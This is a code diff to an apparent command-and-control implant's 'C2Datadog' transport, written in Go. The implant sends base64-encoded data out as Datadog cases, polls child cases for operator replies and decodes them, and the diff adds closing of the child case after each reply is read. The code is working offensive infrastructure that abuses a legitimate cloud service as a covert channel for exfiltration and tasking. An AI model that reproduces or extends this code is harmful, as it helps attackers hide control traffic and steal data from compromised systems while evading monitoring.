@@ -378,9 +378,11 @@ func (c *C2Datadog) SendMessage(sendData []byte) []byte {
 		utils.PrintDebug(fmt.Sprintf("after killdate, exiting\n"))
 		os.Exit(1)
 	}
+
+	ctx := context.Background()
 	//create project if one doesn't exist for us yet
 	if c.apiClient.ProjectId == "" {
-		projectId, err := c.apiClient.createProject(context.Background(), UUID)
+		projectId, err := c.apiClient.createProject(ctx, UUID)
 		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("Error creating new project: %v", err))
 			return nil
@@ -388,7 +390,7 @@ func (c *C2Datadog) SendMessage(sendData []byte) []byte {
 		c.apiClient.ProjectId = projectId
 	}
 	// Create Case and do status, write, priority
-	caseId, err := c.apiClient.writeCase(context.Background(), sendDataBase64)
+	caseId, err := c.apiClient.writeCase(ctx, sendDataBase64)
 	if err != nil {
 		utils.PrintDebug(fmt.Sprintf("error failed to write message to case: %v\n", err))
 		return make([]byte, 0)
@@ -398,7 +400,7 @@ func (c *C2Datadog) SendMessage(sendData []byte) []byte {
 	var i int
 	for i = 0; i < 5; i++ {
 		c.Sleep()
-		childCaseId, err = c.apiClient.getChildCase(context.Background(), caseId)
+		childCaseId, err = c.apiClient.getChildCase(ctx, caseId)
 		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("error failed to get child case: %v\n", err))
 		}
@@ -410,8 +412,11 @@ func (c *C2Datadog) SendMessage(sendData []byte) []byte {
 		utils.PrintDebug(fmt.Sprintf("error failed to find response after %d attempts: %v", i, err))
 		return make([]byte, 0)
 	}
-	messages, _, err := c.apiClient.getCaseCommentMessages(context.Background(), childCaseId)
-
+	messages, _, err := c.apiClient.getCaseCommentMessages(ctx, childCaseId)
+	resp, err := c.apiClient.closeCase(ctx, childCaseId, c.apiClient.ProjectId)
+	if err != nil {
+		utils.PrintDebug(fmt.Sprintf("error failed to close child case: %v got response: %v\n", err, resp))
+	}
 	raw, err := base64.StdEncoding.DecodeString(strings.Join(messages, ""))
 
 	if len(c.Key) != 0 {
